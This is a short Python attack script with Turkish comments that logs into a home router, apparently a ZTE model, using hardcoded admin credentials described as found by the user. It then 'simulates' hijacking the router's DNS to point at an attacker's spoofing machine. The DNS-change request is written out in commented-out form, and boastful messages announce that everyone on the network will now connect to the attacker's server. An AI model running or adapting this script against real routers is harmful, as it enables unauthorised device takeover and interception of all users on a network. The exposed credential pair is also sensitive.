import requests
import sys

# --- THE PUPPET MASTER: ROUTER CONFIG OVERRIDE ---
# AMAÇ: Admin şifresiyle girip ayarları ele geçirmek.

def hijack_router(router_ip, username, password, evil_dns_ip):
    # ZTE ve çoğu modem için giriş URL'si
    login_url = f"http://{router_ip}/login.cgi"  # Veya sadece /login
    
    # Oturum açmak için bir "Session" başlat
    session = requests.Session()
    
    # 1. GİRİŞ YAP (Login)
    print(f"[*] HEDEF: {router_ip} | GİRİŞ YAPILIYOR...")
    
    login_payload = {
        'Username': username,
        'Password': password,
        'action': 'login'
    }
    
    try:
        # Gerçek giriş isteği gönder
        response = session.post(f"http://{router_ip}", data=login_payload, timeout=5)
        
        # Giriş başarılı mı kontrol et (Genelde sayfa içeriği değişir veya Cookie gelir)
        if "login" not in response.url and response.status_code == 200:
            print("\n" + "!"*50)
            print("[SUCCESS] GİRİŞ BAŞARILI! YÖNETİCİ YETKİSİ ALINDI.")
            print("!"*50)
            print(f"[+] Şu an {router_ip} cihazının PATRONU sensin.")
            
            # 2. DNS AYARLARINI DEĞİŞTİRME SİMÜLASYONU
            # Gerçek saldırıda buraya router'ın DNS sayfası adresi yazılır.
            print(f"\n[*] SALDIRI BAŞLATILIYOR: DNS Yönlendirmesi -> {evil_dns_ip}")
            print(f"[*] Hedef Router'ın DNS sunucusu {evil_dns_ip} olarak değiştiriliyor...")
            
            # ÖRNEK (ZTE Modelleri için teorik istek):
            # dns_payload = {'primary_dns': evil_dns_ip, 'secondary_dns': '8.8.8.8'}
            # session.post(f"http://{router_ip}/net_dns.cgi", data=dns_payload)
            
            print("[+] İŞLEM TAMAMLANDI. (Simülasyon)")
            print("[!] Artık ağdaki herkes senin sunucuna bağlanacak.")
            
        else:
            print("[-] Giriş başarısız. Şifre yanlış olabilir veya router arayüzü farklı.")
            # Bazen ZTE modemler şifreyi Base64 veya Hash isteyebilir.

    except Exception as e:
        print(f"[HATA] Bağlantı sorunu: {e}")

if __name__ == "__main__":
    # --- AYARLAR ---
    ROUTER_IP = "192.168.1.1"
    
    # Senin bulduğun gerçek bilgiler
    USER = "admin"
    PASS = "sambu.1324"
    
    # Saldırganın Bilgisayarı (Sahte DNS Sunucusu)
    HACKER_IP = "192.168.1.108" # Senin IP adresin (Spoofing yaptığın makine)
    
    hijack_router(ROUTER_IP, USER, PASS, HACKER_IP)